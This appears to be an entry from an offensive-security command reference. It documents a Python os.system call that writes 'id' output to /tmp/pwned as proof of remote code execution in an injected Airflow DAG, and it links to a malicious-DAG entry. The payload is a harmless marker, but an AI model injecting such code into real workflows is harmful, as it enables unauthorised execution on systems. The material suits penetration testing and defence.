---
data: os.system("id >>/tmp/pwned")
tags:
  - rce
type: command
output: Appends uid=1000(airflow) gid=1000(airflow) ... to /tmp/pwned
executor: python
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:09.454Z'
id: 29a8e8ed-60e2-4bff-849d-55610c61fe46
verified: false
validated: true
submitted: true
---
# os-system-id

## Command

```python
os.system("id >>/tmp/pwned")
```

## Description

Executes the 'id' shell command via Python's os.system, appending user/group info to /tmp/pwned for RCE demonstration within the injected DAG.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"id >>/tmp/pwned"` | Shell command to run and redirect | Yes |

## Examples

### Basic Usage (in Python script)

```python
import os
os.system("id >>/tmp/pwned")
```

### Standalone Test

```bash
python3 -c 'import os; os.system("id >>/tmp/pwned")'
cat /tmp/pwned
```

## Expected Output

Appends user ID info to /tmp/pwned (e.g., uid=1000(airflow) gid=1000(airflow)).

## Related

- [[commands/write-malicious-dag]]
